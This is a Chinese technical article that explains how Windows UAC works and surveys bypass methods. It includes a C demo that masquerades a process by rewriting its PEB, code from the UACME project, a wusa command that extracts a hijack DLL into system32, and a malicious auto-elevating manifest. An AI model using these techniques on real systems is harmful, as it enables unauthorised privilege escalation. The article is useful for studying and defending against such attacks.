# BypassUAC原理及方法汇总

阅读量 **513034**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-09-21 14:30:06

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t0154c1e3db4a29ec3b.jpg)

本文为UAC绕过方式的一些总结，辅以一些个人理解，请各位大佬指正。

## 什么是UAC

根据MSDN中的[文档](https://docs.microsoft.com/en-us/cpp/security/how-user-account-control-uac-affects-your-application?redirectedfrom=MSDN&view=vs-2019),User
Account Control(UAC)是在Windows Vista 以后版本中引入的一种安全机制,针对具有有限权限的账户.

> 通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC
> 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。

![](https://p1.ssl.qhimg.com/t013423df239e9b9eed.png)

> Launched with virtualization意味着对注册表或者文件系统的更改会在程序结束时失效
>
> launched without elevated privilege 即在非特权级下运行

从上图中,我们看到如果想获取管理员权限(让程序在特权级运行),有以下几种方式:

  * 通过run as administer/ 在shell中执行runas
  * 未启用UAC
  * 进程已经拥有管理权限控制
  * 进程被用户允许通过管理员权限运行

## UAC的实现

ACL（Access Control List）：Windows 中所有资源都有 ACL ，这个列表决定了拥有何种权限的用户/进程能够这个资源。

在开启了 UAC 之后，如果用户是标准用户， Windows 会给用户分配一个标准 `Access Token`  
如果用户以管理员权限登陆，会生成两份访问令牌，一份是完整的管理员访问令牌（Full Access
Token），一份是标准用户令牌。一般情况下会以标准用户权限启动 Explorer.exe 进程。如果用户同意，则赋予完整管理员权限访问令牌进行操作。

可以使用`whoami /priv` 看当前的权限

![](https://p3.ssl.qhimg.com/t0105810bcf3b64dfc1.png)

在研究一些对抗方法的时候,我们可以从“ **安全总是要让步于业务**
”这个不成文的规则入手,不管是一些为了用户体验导致的安全性上的牺牲,或者是为了业务逻辑不得不做的一些不安全配置都是因为如此,举一个例子:我们在开启UAC的情况下，向安装位置在%PROGRAMFILES%安装文件时，总会弹出UAC提示，但是我们安装完成后，在进行程序卸载时却不会弹出任何UAC提示，细心的思考一下，你可能就会开始琢磨其中的端倪。本质上是因为Widnows为这些程序（或者接口）开启了autoElevate,也就是说Windows系统本身维护了一批这样的在UAC白名单中的程序,而我们就可以利用他们来绕过UAC,当然,这只是其中一种方式.

## 触发UAC

  * 配置Windows Update
  * 增加或删除用户账户
  * 改变用户的账户类型
  * 改变UAC设置
  * 安装ActiveX
  * 安装或移除程序
  * 安装设备驱动程序
  * 设置家长控制
  * 将文件移动或复制到Program Files或Windows目录
  * 查看其他用户文件夹

等等有很多,具体参考[这里](https://en.wikipedia.org/wiki/User_Account_Control#Tasks_that_trigger_a_UAC_prompt)

**触发流程** :  
在触发 `UAC`
时，系统会创建一个`consent.exe`进程，该进程用以确定是否创建管理员进程（通过白名单和用户选择判断），然后`creatprocess`请求进程,将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo的RAiLuanchAdminProcess函数，该函数首先验证路径是否在白名单中，并将结果传递给consent.exe进程，该进程验证被请求的进程签名以及发起者的权限是否符合要求，然后决定是否弹出UAC框让用户进行确认。这个UAC框会创建新的安全桌面，屏蔽之前的界面。同时这个UAC框进程是SYSTEM权限进程，其他普通进程也无法和其进行通信交互。用户确认之后，会调用CreateProcessAsUser函数以管理员权限启动请求的进程

## BypassUAC

目前公开的绕过UAC的几种方式:

  1. 各类的UAC白名单程序的DLL劫持
  2. 各类自动提升权限的COM接口利用(Elevated COM interface)
  3. Windows 自身漏洞提权
  4. 远程注入

本文主要论述前两种方法

###  UACME

在分析之前,先介绍一个项目:https://github.com/hfiref0x/UACME,内含60+种BypassUAC的方法,后续会提到,其中包括的工具列表如下:

  * Akagi 是项目的主程序，其中包含了所有的Methods，绕过UAC的主要方法的源码都在Method目录下，会以UAC绕过方法的发现者的名字来命名源文件。
  * Akatsuki 又叫做“晓”，WOW64 logger绕过UAC的利用方法的DLL源码
  * Fubuki 又叫做“暴风雪“,好几个绕过UAC利用的代理DLL，他们都共用了劫持Ole32.dll的方法
  * Hibiki 又叫做“声音”，AVRF方法绕过UAC的利用方法的DLL源码
  * Ikazuchi 又叫做”雷声“，利用劫持 comctl32.dll 组件绕过UAC的利用方法的DLL源码
  * Inazuma 又叫做“闪电”，SHIM相关利用的绕过UAC的利用方法的EXE源码
  * Kamikaze 又叫做“神风”，未在工程文件中引用，MMC劫持方法利用的MSC文件
  * Kongou 又叫做“金刚”，利用Hybrid方法绕过UAC的Dll，已经排除在新工程中的引用了
  * Naka 又叫做“空气”，压缩及亦或编码的小工具源码
  * Yuubari Aka UACView用来查看相关UAC的设定信息，以及扫描存在可利用的程序的工具

clone到本地后,用VS2019打开,选择uacme.vcxproj,以Release|x64去build(这个根据需要,64位系统就用x64),然后`ctrl+b`build项目,生成的项目在source/Akag/output下

![](https://p2.ssl.qhimg.com/t01ae5d19e0a45f6fe4.png)

####  Akagi64

使用`vs2019`本地编译后可以使用`akagi32 41`或者`akagi64
41`启动程序，`41`这个指的是`README`中描述的方法索引，运行后可以直接得到管理员权限的`cmd`窗口。

![](https://p5.ssl.qhimg.com/t0192dec03761d45c51.png)

####  Yuubari

编译方法同上,会生成一个UacInfo64.exe,该工具可以快速查看系统的UAC设定信息以及所有可以利用的程序和COM组件,使用方法如下(会在同一目录下生成一个log文件记录所有输出结果)

![](https://p5.ssl.qhimg.com/t0157317146f5c32099.png)

这个怎么看,后面会说

###  利用白名单

上文也已经分析了,如果进程本身具有管理员权限或者可以直接获取管理员权限的话,就不会弹出UAC框让用户确认,这类程序被称为白名单程序，例如：`slui.exe`、`wusa.exe`、`taskmgr.exe`、`msra.exe`、`eudcedit.exe`、`eventvwr.exe`、`CompMgmtLauncher.exe`，`rundll32.exe`，`explorer.exe`等等。

常见的利用方式有：

  * `DLL`注入（`RDI`技术），一般注入到常驻内存的可信进程，如：`explorer`
  * `DLL`劫持，常和注册表配合使用达到劫持目的

####  伪装成白名单的方法

后续提到的很多方法都需要白名单的进程调用才能自动提权,但是我们的程序本身是我不在白名单的,此时就需要使用伪装白名单的方式来伪装成白名单的调用,使用的方法是伪装进程PEB.

_PEB结构_ （Process Envirorment Block Structure）.
英文翻译过来就是进程环境信息块,微软并未完全公布该结构的所有字段含义,只是公布了部分的.该结构中存放了进程信息，每个进程都有自己的 PEB
信息。通过修改目标进程的PEB结构中的路径信息和命令行信息为想要伪装的对象一致,就可以将目标进程伪装成想要伪装的目标.实现原理如下:

  1. 通过NtQueryInformationProcess函数获取指定进程PEB地址。因为该进程与我们的进程可能不在一个进程空间内，所以需要调用WIN32API函数ReadProcessMemory和WriteProcessMemory函数来读写目标进程内存。
  2. 根据PEB中的ProcessParameters来获取并修改指定进程的RTL_USER_PROCESS_PARAMETERS信息，这个结构体中保存了PEB的路径信息、命令行信息，修改之后，即可实现进程伪装。

**注意**
，如果修改进程运行在64位系统上，那么就要编译为64位；反之，如果修改进程运行在32位系统上，那么就要编译为32位。（跟被修改进程无关）这样才能成功修改PEB。

几个关键结构/函数：

    
    
    typedef struct _PROCESS_BASIC_INFORMATION {
        PVOID Reserved1;
        PPEB PebBaseAddress; //peb的基地址
        PVOID Reserved2[2];
        ULONG_PTR UniqueProcessId;
        PVOID Reserved3;
    } PROCESS_BASIC_INFORMATION;
    

用NtQueryInformationProcess获取到的内存信息就是该结构的，其中的PebBaseAddress字段记录了PEB的基地址，为一个_PEB的结构体指针

    
    
    typedef struct _PEB {
      BYTE                          Reserved1[2];
      BYTE                          BeingDebugged; //被调试状态 这个很多地方用到
      BYTE                          Reserved2[1];
      PVOID                         Reserved3[2];
      PPEB_LDR_DATA                 Ldr;
      PRTL_USER_PROCESS_PARAMETERS  ProcessParameters; // 进程参数信息
      BYTE                          Reserved4[104];
      PVOID                         Reserved5[52];
      PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
      BYTE                          Reserved6[128];
      PVOID                         Reserved7[1];
      ULONG                         SessionId;
    } PEB, *PPEB;
    

主要用到ProcessParameters，PRTL_USER_PROCESS_PARAMETERS的结构为：

    
    
    typedef struct _RTL_USER_PROCESS_PARAMETERS {
        BYTE Reserved1[16];
        PVOID Reserved2[10];
        UNICODE_STRING ImagePathName;
        UNICODE_STRING CommandLine;
    } RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
    

我们只要关注ImagePathName和CommandLine，所以来看看这个UNICODE_STRING结构：

    
    
    typedef struct _UNICODE_STRING {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR  Buffer;
    } UNICODE_STRING;
    

然后是几个关键函数：

    
    
    BOOL ReadProcessMemory(
      _In_ HANDLE  hProcess, // 进程句柄
      _In_ LPCVOID lpBaseAddress, // 读取基址 指向指定进程空间
      _Out_ LPVOID  lpBuffer, // 接收缓存
      _In_ SIZE_T  nSize, // 读取大小
      _Out_opt_ SIZE_T  *lpNumberOfBytesRead // 接收数据的实际大小 可以设置为NULL
    );
    

ReadProcessMemory函数从指定的进程中读入内存信息，被读取的区域必须具有访问权限(PROCESS_VM_READ)。函数执行成功返回非零值。否则返回零，可以使用GetLastError函数获取错误码。

    
    
    BOOL WriteProcessMemory(
      _In_ HANDLE  hProcess, // 进程句柄 INVALID_HANDLE_VALUE表示自身进程
      _In_ LPVOID  lpBaseAddress, // 写入内存首地址
      _Out_ LPCVOID lpBuffer, // 指向欲写入的数据
      _In_ SIZE_T  nSize, // 写入大小
      _Out_opt_ SIZE_T  *lpNumberOfBytesWritten // 接收实际写入大小 可以设置为NULL
    );
    

WriteProcessMemory函数能写入某一进程的内存区域。入口区必须可以访问(PROCESS_VM_WRITE和PROCESS_VM_OPERATION
)，否则操作将失败

这里自己写一个小Demo来帮助理解:

    
    
    #include <stdio.h>
    #include <Windows.h>
    #include <winternl.h> //PEB Structures, NtQueryInformationProcess
    #include <TlHelp32.h>
    
    //prepare for call NtQueryInformationProcess func
    typedef NTSTATUS(NTAPI* typedef_NtQueryInformationProcess)(
        IN HANDLE ProcessHandle,
        IN PROCESSINFOCLASS ProcessInformationClass,
        OUT PVOID ProcessInformation,
        IN ULONG ProcessInformationLength,
        OUT PULONG ReturnLength OPTIONAL
        );
    
    // modify ImagePathName and CommandLine in PEB of specific process
    BOOL DisguiseProcess(DWORD dwProcessId, wchar_t* lpwszPath, wchar_t* lpwszCmd) {
    
        // get handle of process
        /*
        OpenProcess(访问权限, 进程句柄是否被继承, 要被打开的进程PID)
        */
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
        if (hProcess == NULL) {
            printf("Open Process error!");
            return FALSE;
        }
    
        // prepare for getting PEB
        typedef_NtQueryInformationProcess NtQueryInformationProcess = NULL;
        PROCESS_BASIC_INFORMATION pbi = { 0 };
        PEB peb = { 0 };
        RTL_USER_PROCESS_PARAMETERS Param = { 0 };
        USHORT usCmdLen = 0;
        USHORT usPathLen = 0;
        const WCHAR* NTDLL = L"ntdll.dll";
    
        //NtQueryInformationProcess这个函数没有关联的导入库，必须使用LoadLibrary和GetProcessAddress函数从Ntdll.dll中获取该函数地址
        NtQueryInformationProcess = (typedef_NtQueryInformationProcess)GetProcAddress(LoadLibrary(NTDLL), "NtQueryInformationProcess");
        if (NULL == NtQueryInformationProcess)
        {
            printf("GetProcAddress Error");
            return FALSE;
        }
    
        // get status of specific process
        NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
        if (!NT_SUCCESS(status))
        {
            printf("NtQueryInformationProcess failed");
            return FALSE;
        }
    
        // get PebBaseAddress in PROCESS_BASIC_INFORMATION of prococess
        ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
        // get ProcessParameters in PEB of process
        ReadProcessMemory(hProcess, peb.ProcessParameters, &Param, sizeof(Param), NULL);
    
        // modify cmdline data
        usCmdLen = 2 + 2 * wcslen(lpwszCmd); // cal lenth of unicode str
        WriteProcessMemory(hProcess, Param.CommandLine.Buffer, lpwszCmd, usCmdLen, NULL);
        WriteProcessMemory(hProcess, &Param.CommandLine.Length, &usCmdLen, sizeof(usCmdLen), NULL);
        // modify path data
        usPathLen = 2 + 2 * wcslen(lpwszPath); // cal lenth of unicode str
        WriteProcessMemory(hProcess, Param.ImagePathName.Buffer, lpwszPath, usPathLen, NULL);
        WriteProcessMemory(hProcess, &Param.ImagePathName.Length, &usPathLen, sizeof(usPathLen), NULL);
    
        return TRUE;
    }
    
    // get PID by ProcessName
    DWORD FindProcId(const WCHAR* ProcName) {
        DWORD ProcId = 0; // target procId
        PROCESSENTRY32 pe32 = { 0 };  // to get snapshot structure
        pe32.dwSize = sizeof(PROCESSENTRY32);
        HANDLE hProcessShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // get snapshot list
        if (hProcessShot == INVALID_HANDLE_VALUE) {
            puts("get proc list error");
            return 0;
        }
        BOOL cProc = Process32First(hProcessShot, &pe32); // prepare for loop of proc snapshot list
        // compare proc name and get correct process Id
        while (cProc) {
            if (wcscmp(pe32.szExeFile, ProcName) == 0) {
                ProcId = pe32.th32ProcessID;
                break;
            }
            cProc = Process32Next(hProcessShot, &pe32);
        }
        return ProcId;
    }
    
    int main()
    {
        const WCHAR* ProcessName = L"Calculator.exe";
        do {
            DWORD dwTargetId = FindProcId(ProcessName);
            if (0 == dwTargetId) {
                printf("can not find procIdn");
                break;
            }
            if (FALSE == DisguiseProcess(dwTargetId, (wchar_t*)L"C:\\Windows\\explorer.exe", (wchar_t*)L"C:\\Windows\\Explorer.EXE"))
            {
                printf("Dsisguise Process Error.");
                break;
            }
            printf("Disguise Process OK.");
        } while (FALSE);
    
        system("pause");
        return 0;
    }
    

这里有几点需要注意的：

  1. 计算长度时，由于wcslen返回的是unicode的字符个数，每个unicode字符占两个字节，在加上结尾的两个空字节，所以是2+2*wcslen(lpwszCmd)
  2. NtQueryInformationProcess这个函数没有关联的导入库，必须使用LoadLibrary和GetProcessAddress函数从Ntdll.dll中获取该函数地址

Demo运行后，会将Calculator.exe的cmdline和imagepath修改为指定进程的，如果想将路径也伪装正确，可以调用GetModuleFileNameEx、GetProcessImageFileName或者QueryFullProcessImageName等函数获取伪装进程的正确路径

在UACME项目中，是由supMasqueradeProcess函数实现了该技术，原理是一样的，只不过该函数实现的是伪装自身的信息。

####  DLL劫持的几种方式

#####  DLL加载顺序劫持

DLL劫持中最常见的一种劫持方法，即在程序所在目录放置要劫持的DLL，程序启动时首先从本目录加载DLL，从而导致DLL劫持,DLL的加载顺序如下:

  * 1.程序所在目录
  * 2.程序加载目录（SetCurrentDirectory）
  * 3.系统目录即 SYSTEM32 目录
  * 4.16位系统目录即 SYSTEM 目录
  * 5.Windows目录
  * 6.PATH环境变量中列出的目录

PS：Windows操作系统通过“DLL路径搜索目录顺序”和“Know
DLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能

1号方法用的就是这种方法,以此为例分析一下,7号方法的信息如下:

> 7.Author: Win32/Carberp derivative
>
>   * Type: Dll Hijack
>   * Method: WUSA
>   * Target(s): \system32\cliconfg.exe
>   * Component(s): ntwdblib.dll
>   * Implementation: ucmWusaMethod
>   * Works from: Windows 7 (7600)
>   * Fixed in: Windows 10 TH1 (10147)
>     * How: WUSA /extract option removed
>

这里顺便以7号方法为例,分析一下UACMe的代码实现:

主程序:main.c,入口在ucmMain() 传入一个method号,其中method是个枚举类型_UCM_METHOD:

    
    
    typedef enum _UCM_METHOD {
        UacMethodTest = 0,          //+
        UacMethodSysprep1 = 1,      //+
        UacMethodSysprep2,          //+
        UacMethodOobe,              //+
        UacMethodRedirectExe,       //+
        UacMethodSimda,             //+
        UacMethodCarberp1,          //+
        UacMethodCarberp2,          //+
        UacMethodTilon,             //+
        UacMethodAVrf,              //+
        UacMethodWinsat,            //+
        UacMethodShimPatch,         //+
        UacMethodSysprep3,          //+
        UacMethodMMC1,              //+
        UacMethodSirefef,           //+
        UacMethodGeneric,           //+
        UacMethodGWX,               //+
        UacMethodSysprep4,          //+
        UacMethodManifest,          //+
        UacMethodInetMgr,           //+
        UacMethodMMC2,              //+
        UacMethodSXS,               //+
        UacMethodSXSConsent,        //+
        UacMethodDISM,              //+
        UacMethodComet,             //+
        UacMethodEnigma0x3,         //+
        UacMethodEnigma0x3_2,       //+
        UacMethodExpLife,           //+
        UacMethodSandworm,          //+
        UacMethodEnigma0x3_3,       //+
        UacMethodWow64Logger,       //+
        UacMethodEnigma0x3_4,       //+
        UacMethodUiAccess,          //+
        UacMethodMsSettings,        //+
        UacMethodTyranid,           //+
        UacMethodTokenMod,          //+
        UacMethodJunction,          //+
        UacMethodSXSDccw,           //+
        UacMethodHakril,            //+
        UacMethodCorProfiler,       //+
        UacMethodCOMHandlers,       //+
        UacMethodCMLuaUtil,         //+
        UacMethodFwCplLua,          //+
        UacMethodDccwCOM,           //+
        UacMethodVolatileEnv,       //+
        UacMethodSluiHijack,        //+
        UacMethodBitlockerRC,       //+
        UacMethodCOMHandlers2,      //+
        UacMethodSPPLUAObject,      //+
        UacMethodCreateNewLink,     //+
        UacMethodDateTimeWriter,    //+
        UacMethodAcCplAdmin,        //+
        UacMethodDirectoryMock,     //+
        UacMethodShellSdclt,        //+
        UacMethodEgre55,            //+
        UacMethodTokenModUiAccess,  //+
        UacMethodShellWSReset,      //+
        UacMethodSysprep5,          //+
        UacMethodEditionUpgradeMgr, //+
        UacMethodDebugObject,       //+
        UacMethodGlupteba,          //+
        UacMethodShellChangePk,     //+
        UacMethodMsSettings2,       //+
        UacMethodMax,
        UacMethodInvalid = 0xabcdef
    } UCM_METHOD;
    

这些是所有支持的BypassUAC的方式,对应着readme中列举出来的方法

接着就是一些初始化和检查,直接到MethodsManagerCall函数,该函数会在调用前做一些准备工作,包括如果需要额外的payload,会从资源文件中解密出来.MethodsManagerCall还会根据传入的Method号在ucmMethodsDispatchTable这个结构体找到调用方法

![](https://p4.ssl.qhimg.com/t01b94d202e09987e8a.png)

ucmMethodsDispatchTable是一个UCM_API_DISPATCH_ENTRY的结构体数组,跟着看这个结构体的定义

    
    
    // UCM_API_DISPATCH_ENTRY定义
    typedef struct _UCM_API_DISPATCH_ENTRY {
        PUCM_API_ROUTINE Routine;               //执行的方法
        PUCM_EXTRA_CONTEXT ExtraContext;        //该方法执行时依赖的额外内容
        UCM_METHOD_AVAILABILITY Availability;   //可行的最小/最大windows版本号
        ULONG PayloadResourceId;                //使用的payload dll
        BOOL Win32OrWow64Required;
        BOOL DisallowWow64;
        BOOL SetParameters;                     //是否需要shared参数被设置
    } UCM_API_DISPATCH_ENTRY, *PUCM_API_DISPATCH_ENTRY;
    

在解析完结构体后,根据配置,加载额外的内容或payload.之后获取其他命令行参数,这里需要重点关注Routine,这个结构体变量,该变量是一个PUCM_API_ROUTINE类型的变量,定义如下:

    
    
    typedef NTSTATUS(CALLBACK *PUCM_API_ROUTINE)(
        _In_ PUCM_PARAMS_BLOCK Parameter
        );
    //稍微扩展一下:
    typedef NTSTATUS(__stdcall *PUCM_API_ROUTINE)(
        _In_ PUCM_PARAMS_BLOCK Parameter
        );
    

即PUCM_API_ROUTINE是一个指向“接受一个PUCM_PARAMS_BLOCK类型作为参数并回传一个NTSTATUS类型值的函数”的指针别名,也就是说可以通过该函数指针去调用该函数.接着看PUCM_PARAMS_BLOCK:

    
    
    typedef struct tagUCM_PARAMS_BLOCK {
        UCM_METHOD Method;
        PVOID PayloadCode;
        ULONG PayloadSize;
    } UCM_PARAMS_BLOCK, *PUCM_PARAMS_BLOCK;
    

PUCM_PARAMS_BLOCK是一个tagUCM_PARAMS_BLOCK的结构体指针,追到这里就可以不用在追了,将关键代码抽出来看:

    
    
    Entry = &ucmMethodsDispatchTable[Method];
    
    ParamsBlock.Method = Method;
    ParamsBlock.PayloadCode = PayloadCode;
    ParamsBlock.PayloadSize = PayloadSize;
    
    MethodResult = Entry->Routine(&ParamsBlock);
    

Entry找到了结构体内对应method的入口,也就是`{ MethodCarberp, NULL, { 7600, 10147 }, FUBUKI_ID,
FALSE, TRUE, TRUE },`这一项,这里作出分析,`MethodResult =
Entry->Routine(&ParamsBlock);`这里其实等价于:``MethodResult =
MethodCarberp(&ParamsBlock)`,我们看MethodCarberp的定义:

    
    
    //#define UCM_API(n) NTSTATUS CALLBACK n(_In_ PUCM_PARAMS_BLOCK Parameter)  
    UCM_API(MethodCarberp)
    {
        //
        // Additional checking for UacMethodCarberp1. 
        // Target application 'migwiz' unavailable in Syswow64 after Windows 7.
        //
        if (Parameter->Method == UacMethodCarberp1) {
            if ((g_ctx->IsWow64) && (g_ctx->dwBuildNumber > 7601)) {
                ucmShowMessage(g_ctx->OutputToDebugger, WOW64STRING);
                return STATUS_UNKNOWN_REVISION;
            }
        }
        return ucmWusaMethod(
            Parameter->Method,
            Parameter->PayloadCode,
            Parameter->PayloadSize);
    }
    

可见最终调用了ucmWusaMethod这个函数,将关键代码摘出来分析下:

    
    
    /*
    * ucmWusaMethod
    *
    * Purpose:
    *
    * Build and install fake msu package then run target application.
    *
    * Fixed in Windows 10 TH1
    *
    */
    NTSTATUS ucmWusaMethod(
        _In_ UCM_METHOD Method,
        _In_ PVOID ProxyDll,
        _In_ DWORD ProxyDllSize
    )
    {
        NTSTATUS    MethodResult = STATUS_ACCESS_DENIED;
        WCHAR       szSourceDll[MAX_PATH * 2];
        WCHAR       szTargetProcess[MAX_PATH * 2];
        WCHAR       szTargetDirectory[MAX_PATH * 2];
    
        _strcpy(szTargetProcess, g_ctx->szSystemDirectory);
        _strcpy(szTargetDirectory, g_ctx->szSystemDirectory);
        _strcpy(szSourceDll, g_ctx->szTempDirectory);
    
        switch (Method) {
        //
        // Use cliconfg.exe as target.
        // szTargetDirectory is system32
        //
        case UacMethodCarberp2:
            _strcat(szSourceDll, NTWDBLIB_DLL);
            _strcat(szTargetProcess, CLICONFG_EXE);
            break;
    
        default:
            return STATUS_INVALID_PARAMETER;
        }
    
        if (!PathFileExists(szTargetProcess)) {
            return STATUS_OBJECT_NAME_NOT_FOUND;
        }
    
        //
        // Extract file to the protected directory
        // First, create cab with fake msu ext, second run fusion process.
        //
        if (ucmCreateCabinetForSingleFile(
            szSourceDll,
            ProxyDll,
            ProxyDllSize,
            NULL))
        {
    
            if (ucmWusaExtractPackage(szTargetDirectory)) {
                //run target process for dll hijacking
                if (supRunProcess(szTargetProcess, NULL))
                    MethodResult = STATUS_SUCCESS;
            }
            ucmWusaCabinetCleanup();
        }
    
        return MethodResult;
    }
    

经过分析可以发现BypassUAC的流程为:

  1. 生成ellocnak.msu，此文件是一个cab格式的文件，内容为ntwdblib.dll文件（该文件为程序生成的加密Payload）,文件放置在用户临时目录下
  2. 通过之前介绍的WUSA将ellocnak.msu解压到system32目录下  
`cmd.exe /c wusa %temp%\ellocnak.msu /extract:%windir%\system32`

  3. 运行C:\windows\system32\cliconfg.exe，进行DLL劫持

该方法劫持了cliconfig.exe对ntwdblib.dll的加载。

跟进生成的payload,看一下具体怎么实现的bypassUAC:

payload是在_UCM_API_DISPATCH_ENTRY中PayloadResourceId字段指明的,但这个字段只是一个payload的资源标识符,真正处理的的部分在methods.c中的supLdrQueryResourceData函数,代码如下:

    
    
    Resource = supLdrQueryResourceData(
          Entry->PayloadResourceId,
          ImageBaseAddress,
          &DataSize);
    

supLdrQueryResourceData中的关键部分如下:

    
    
    if (DllHandle != NULL) {
    
            IdPath[0] = (ULONG_PTR)RT_RCDATA; //type
            IdPath[1] = ResourceId;           //id
            IdPath[2] = 0;                    //lang
    
            status = LdrFindResource_U(DllHandle, (ULONG_PTR*)&IdPath, 3, &DataEntry);
            if (NT_SUCCESS(status)) {
                status = LdrAccessResource(DllHandle, DataEntry, (PVOID*)&Data, &SizeOfData);
                if (NT_SUCCESS(status)) {
                    if (DataSize) {
                        *DataSize = SizeOfData;
                    }
                }
            }
        }
    

其中LdrFindResource_U和LdrAccessResource都是从NTdll中导出的API,LdrFindResource_U会根据资源ID找到相应的资源,如果找到,则返回相应的句柄,后续应该使用LdrAccessResource来使用该句柄,这两个API都没有找到有人分析的使用方法,但是可以跟进payload中,其拓展如下:

![](https://p5.ssl.qhimg.com/t01c7fbbeadb42246e3.png)

这里又可以在bin32res.rc中找到资源文件的路径,这里就是加密的payload的了,刚刚我们看到在定义IDPath时,第一项type值为RT_RCDATA,指明了该资源是由.rc文件中的RCDATA字段指出其位置的,可以看到就是bin/fubuki32.cd

![](https://p2.ssl.qhimg.com/t01f027b1eaff047bba.png)

我们接着在程序中寻找解密的算法,其解密算法在compress.c中的DecompressPayload函数中定义:

    
    
    PVOID DecompressPayload(
        _In_ ULONG PayloadId,
        _In_ PVOID pbBuffer,
        _In_ ULONG cbBuffer,
        _Out_ PULONG pcbDecompressed
    )
    

其对应的参数为:

`PayloadCode = g_ctx->DecompressRoutine(Entry->PayloadResourceId, Resource,
DataSize, &PayloadSize);`

Resource是加密的资源文件,在这里处理了加密过程

![](https://p3.ssl.qhimg.com/t01f6b4dd999ac8cee2.png)

受篇幅所限,这里就不继续跟下去了,有兴趣的读者可以继续,其中密钥被放在了secrets.h中.这种方法就先说到这里

该项目中大部分Bypass UAC的方式都是这种DLL劫持的方法，只是劫持的DLL和EXE有所不同。

#####  使用manifest文件进行DLL劫持

利用manifest进行Bypass UAC的方式是微软在修复一次由DLL加载顺序劫持导致的Bypass UAC时自己暴露出来的一种Bypass
UAC的可行方案。

介绍一下manifest:

>
> XP以前版本的windows，执行EXE时会像之前介绍的顺序寻找相应的dll，Manifest只是个多余的文件或资源，dll文件会直接到system32的目录下查找，并且调用。  
>
> 而XP及其以后的操作系统，则会首先读取Manifest，获得exe文件需要调用的DLL列表（此时获得的，并不直接是DLL文件的本身的位置，而是DLL的manifest）操作系统再根据DLL的Manifest提供的信息去寻找对应的DLL
> ，这样就可能区别不同版本的同一个DLL文件。

在Windows中有些可执行程序没有内置的manifest，假设这个程序叫test.exe，如果攻击者在该可执行程序目录下新建一个test.exe.manifest并在manifest文件中指定file元素，则test.exe执行时会加载file元素中loadFrom属性指定的DLL（loadFrom的dll不能在KnownDlls中）

方法18就是采用这种方法,详情如下:

    
    
    Author: Leo Davidson derivative
        Type: Dll Hijack (Manifest)
        Method: IFileOperation
        Target(s): \system32\taskhost.exe, \system32\tzsync.exe (any ms exe without manifest)
        Component(s): Attacker defined
        Implementation: ucmAutoElevateManifest
        Works from: Windows 7 (7600)
        Fixed in: Windows 10 RS1 (14371)
            How: Manifest parsing logic reviewed
    

BypassUAC的过程如下(以win7版本为例)

  1. 先从C:\windows\system32下拷贝taskhost.exe到%temp%\临时目录下,再利用高权限进程把taskhost.exe拷贝到C:\windows下
  2. 在C:\windows\system32\sysprep下写一个cryptbase.dll(因为在C:\windows\system32\下本身存在cryptbase.dll，为了不影响系统功能，需要将攻击者自定义内容的cryptbase.dll拷贝到其他地方)并将payload注入到cryptbase.dll中
  3. 在C:\windows下写入taskhost.exe.manifest文件.由于taskhost.exe无内置清单文件，所以会从manifest中指定的路径加载DLL即C:\Windows\system32\sysprep\cryptbase.DLL（该DLL的名称可变，但file标签下name的值也需要相应变化,这个标签指明了taskhost.exe会自动加载的dll名称，即cryptbase.DLL）

我们看一下taskhost.exe.manifest的内容

    
    
    <?xml version='1.0' encoding='utf-8' standalone='yes'?>
    <assembly
        xmlns="urn:schemas-microsoft-com:asm.v1"
        xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"
        manifestVersion="1.0"
    >
    <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
    <requestedPrivileges>
    <requestedExecutionLevellevel="requireAdministrator"uiAccess="false" />
    </requestedPrivileges>
    </security>
    </trustInfo>
    <asmv3:application>
    <asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
    <autoElevate>true</autoElevate>
    </asmv3:windowsSettings>
    </asmv3:application>
    <fileloadFrom="C:\Windows\system32\sysprep\cryptbase.DLL"name="cryptbase.DLL" />
    </assembly>
    

在这个方法中,还有一点值得一提,那就是怎么向系统目录中写文件而不触发UAC,在项目中,ucmMasqueradedMoveFileCOM这个函数提供了向特权目录写而不触发UAC的功能,其是通过借助IFileOperation
COM对象进行操作的.

IFileOperation
COM对象进行文件操作是可以自动提升权限(AutoElevate)(从标准用户到管理员用户)，但是它会检查当前使用该COM对象的进程是否为白名单进程，仅白名单进程的条件下可以进行自动权限提升。

在白名单进程中使用IFileOperation COM向受保护目录写文件时不会弹出UAC窗口。

#####  使用WinSxS机制进行DLL劫持

WinSxS位于%systemroot%\WinSxS,为windows XP
SP2后引入的一种机制,其中存放的是windows系统文件以及Dll文件的若干个副本,由于应用程序可以使用同一个DLL文件，因此出于兼容性与还原至旧版本的考虑，系统会在这里存放多个不同版本的文件副本。

SxS允许二进制文件嵌入manifest文件来表达详细的二进制依赖信息,当Windows公共控件包comctl32.dll被分裂为多个可以相互并存的版本以后该机制被使用，因而应用程序可以加载正确版本的二进制文件。此后其他的二进制文件也采用相同的方式进行版本管理。

C:\Windows\System32\sysprep\sysprep.exe的manifest文件如下，其中定义了dependency字段，这字段就是用来表达详细的二进制依赖信息的。

    
    
    ......
    <dependency>
    <dependentAssembly>
    <assemblyIdentity
               type="win32"
               name="Microsoft.Windows.Common-Controls"
               version="6.0.0.0"
               processorArchitecture="amd64"
               publicKeyToken="6595b64144ccf1df"
           language="*"
          />
    </dependentAssembly>
    </dependency>
    
    </assembly>
    ......
    

